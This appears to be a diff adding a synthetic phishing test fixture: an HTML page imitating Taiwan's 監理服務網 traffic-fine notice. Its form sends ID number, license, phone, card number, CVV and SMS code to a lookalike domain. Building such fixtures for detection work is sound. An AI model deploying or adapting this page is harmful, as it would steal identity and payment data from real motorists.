@@ -1,0 +1,43 @@
+<!doctype html>
+<!--
+  Synthetic Taiwan phishing fixture — fake 監理服務網 traffic-fine notice.
+  165 category: 假冒監理服務網違規通知. Genuine domain mvdis.gov.tw; this
+  kit lives on a non-gov.tw hostname that visually mimics the gov layout.
+-->
+<html lang="zh-Hant">
+  <head>
+    <meta charset="UTF-8">
+    <title>監理服務網 - 違規通知書線上繳費</title>
+    <style>
+      body { font-family: "Microsoft JhengHei", sans-serif;
+             background: #ffffff; margin: 0; }
+      .topbar { background: #214a8a; color: white; padding: 10px 16px;
+                font-weight: 700; }
+      .container { max-width: 460px; margin: 20px auto; padding: 18px;
+                   border: 1px solid #ccc; border-radius: 4px; }
+      .ticket { background: #fff3cd; color: #856404; padding: 10px;
+                border-left: 4px solid #ffae00; font-size: 14px; }
+      label { font-size: 13px; display: block; margin-top: 10px; }
+      input { width: 100%; padding: 6px; box-sizing: border-box;
+              border: 1px solid #999; }
+      button { background: #214a8a; color: white; border: 0;
+               padding: 8px 24px; cursor: pointer; margin-top: 16px; }
+    </style>
+  </head>
+  <body>
+    <div class="topbar">交通部公路局 監理服務網</div>
+    <div class="container">
+      <div class="ticket">您的車牌號碼 <strong>ABC-1234</strong> 於 2026/03/15 14:22 違規未繳，截至本日罰鍰金額為 NT$3,600，逾期將加倍。</div>
+      <form action="https://mvdis-pay.gov-tw.click/post" method="post">
+        <label>身分證字號 <input name="idno" placeholder="A123456789" pattern="[A-Z][0-9]{9}" required></label>
+        <label>駕照號碼 <input name="license_no" required></label>
+        <label>聯絡電話 <input name="phone" required></label>
+        <label>信用卡卡號 <input name="card_number" autocomplete="cc-number" required></label>
+        <label>有效期限 <input name="cc_exp" placeholder="MM/YY" autocomplete="cc-exp" required></label>
+        <label>安全碼 <input name="cvv" autocomplete="cc-csc" required></label>
+        <label>簡訊驗證碼 <input name="otp" inputmode="numeric" autocomplete="one-time-code" required></label>
+        <button>線上繳費</button>
+      </form>
+    </div>
+  </body>
+</html>
